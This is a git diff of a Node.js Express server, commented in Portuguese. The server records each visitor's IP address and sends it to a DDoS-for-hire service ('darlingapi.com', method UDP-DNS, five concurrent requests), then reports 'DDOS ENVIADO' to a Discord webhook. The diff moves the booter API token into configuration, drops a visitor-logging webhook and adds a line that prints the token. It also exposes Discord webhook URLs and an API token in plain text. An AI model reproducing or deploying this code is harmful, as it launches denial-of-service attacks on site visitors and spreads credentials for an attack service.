@@ -5,13 +5,14 @@ const axios = require('axios');
 const compression = require('compression');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
+const config = require('./config');
 const app = express();
-const port = process.env.PORT || 4000;
+const port = env.PORT || 4000;
+const token = process.env.TOKEN || config.TOKEN
 
 const visitorsFile = path.join(__dirname, 'data', 'visitors.json');
 const configFile = path.join(__dirname, 'data', 'config.json');
-const discordWebhookUrl = 'https://discord.com/api/webhooks/1271927639380328552/vINs9B4ZsbixDl4MzqVt2YWckm08VqdR-0osHOCPd25PqbePAOomq569Crl28yFP8acm'; 
-const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1271934485382041752/gS-cZhznQJKrs0zCzvkFeUhaMkNjV1eicrtFk8fllpe_julu_TNiGNaA9ZdwL-buoTck';
+const discordWebhookUrl = 'https://discord.com/api/webhooks/1271934485382041752/gS-cZhznQJKrs0zCzvkFeUhaMkNjV1eicrtFk8fllpe_julu_TNiGNaA9ZdwL-buoTck';
 let lock = false;
 let visitorsCache = [];
 let configCache = { lastCleanup: new Date().toISOString() }; 
@@ -54,7 +55,7 @@ async function clear() {
 
 
 async function sendApiRequest(ip) {
-    const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=60&method=UDP-DNS`;
+    const url = `https://darlingapi.com?token=${token}&host=${ip}&port=0&time=60&method=UDP-DNS`;
     const requests = Array(5).fill(url).map(u => axios.get(u));
     
     try {
@@ -67,11 +68,11 @@ async function sendApiRequest(ip) {
 
 async function verificar() {
     try {
-        const response = await axios.get('https://darlingapi.com/status?token=af1f1818-3541-411f-a643-db88e2c575ff');
+        const response = await axios.get(`https://darlingapi.com/status?token=${token}`);
         const data = response.data;
 
         if (data.account.running > 0) {
-            const url = "https://darlingapi.com/stop_all?token=af1f1818-3541-411f-a643-db88e2c575ff";
+            const url = `https://darlingapi.com/stop_all?token=${token}`;
             await axios.get(url);
             console.log('Ataques anteriores interrompidos');
         }
@@ -80,22 +81,8 @@ async function verificar() {
     }
 }
 
-async function sendDiscordWebhooks(ip, timestamp) {
-    const webhook1 = axios.post(discordWebhookUrl, {
-        embeds: [{
-            title: 'Novo Visitante',
-            description: `Um novo visitante acessou o site.`,
-            color: 5814783,
-            fields: [
-                { name: 'IP', value: ip, inline: true },
-                { name: 'Data e Hora', value: timestamp, inline: true }
-            ],
-            footer: { text: 'Visitante registrado' },
-            timestamp: new Date()
-        }]
-    });
-
-    const webhook2 = axios.post(discordWebhookUrl2, {
+async function sendDiscordWebhooks(ip) {
+    const webhook2 = axios.post(discordWebhookUrl, {
         embeds: [{
             title: 'DDOS ENVIADO',
             description: `Ataque enviado.`,
@@ -103,7 +90,7 @@ async function sendDiscordWebhooks(ip, timestamp) {
             fields: [
                 { name: 'IP', value: ip, inline: true },
                 { name: 'Concurrents', value: '6', inline: true },
-                { name: 'Time', value: '120', inline: true }
+                { name: 'Time', value: '60', inline: true }
             ],
             timestamp: new Date()
         }]
@@ -163,5 +150,5 @@ app.listen(port, () => {
     console.log(`Server is running at http://localhost:${port}`);
     loadCache().catch(err => console.error('Error loading cache on startup:', err));
 });
-
+console.log(process.env.TOKEN)
 setInterval(clear, 1000 * 60 * 60)
